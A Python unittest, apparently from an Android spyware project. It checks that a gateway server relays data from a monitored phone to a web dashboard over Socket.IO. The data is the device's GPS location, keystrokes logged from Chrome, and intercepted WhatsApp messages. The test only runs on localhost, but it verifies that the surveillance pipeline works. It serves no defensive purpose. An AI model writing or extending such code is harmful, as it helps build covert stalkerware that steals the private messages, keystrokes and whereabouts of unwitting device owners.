import time
import unittest
import socketio

class SocketRelayTest(unittest.TestCase):
    def test_cross_port_socket_relay(self):
        """Tests live Socket.IO cross-port communication between Gateway (5001) and Web Dashboard (8801)."""
        # Client 1: Dashboard listener (Port 8801)
        sio_dash = socketio.Client()
        received_events = []

        @sio_dash.on('device_status_change')
        def on_status(data):
            received_events.append(('status', data))

        @sio_dash.on('location_update')
        def on_loc(data):
            received_events.append(('location', data))

        @sio_dash.on('keylog_received')
        def on_keylog(data):
            received_events.append(('keylog', data))

        @sio_dash.on('social_message_received')
        def on_social(data):
            received_events.append(('social', data))

        sio_dash.connect('http://127.0.0.1:8801')
        self.assertTrue(sio_dash.connected, "Dashboard Socket.IO client should be connected to 8801")

        # Client 2: Hardware Device (Port 5001)
        test_dev_id = "RELAY_TEST_DEVICE"
        sio_hw = socketio.Client()
        sio_hw.connect(f'http://127.0.0.1:5001?device_id={test_dev_id}&model=TestHw&manf=TestBrand&release=14')
        self.assertTrue(sio_hw.connected, "Hardware Socket.IO client should be connected to 5001")

        # Allow connection handshake and relay
        time.sleep(1.0)

        # 1. Send Location from Hardware
        sio_hw.emit('location', {'lat': 19.0760, 'lng': 72.8777, 'time': int(time.time() * 1000)})
        time.sleep(0.5)

        # 2. Send Keylog from Hardware
        sio_hw.emit('keylogs', {'pkg': 'com.android.chrome', 'text': 'cyber eye test', 'time': int(time.time() * 1000)})
        time.sleep(0.5)

        # 3. Send Social Message from Hardware
        sio_hw.emit('social_message', {
            'platform': 'com.whatsapp',
            'contact': 'Alice',
            'text': 'Automated cross-port socket test',
            'isSent': False,
            'time': int(time.time() * 1000)
        })
        time.sleep(0.5)

        # Disconnect hardware
        sio_hw.disconnect()
        time.sleep(0.5)
        sio_dash.disconnect()

        # Assertions
        event_types = [e[0] for e in received_events]
        print(f"  [Socket/Relay] Received events across dual ports: {event_types}")
        self.assertIn('status', event_types, "Dashboard must receive device_status_change")
        self.assertIn('location', event_types, "Dashboard must receive location_update")
        self.assertIn('keylog', event_types, "Dashboard must receive keylog_received")
        self.assertIn('social', event_types, "Dashboard must receive social_message_received")

if __name__ == '__main__':
    unittest.main(verbosity=2)
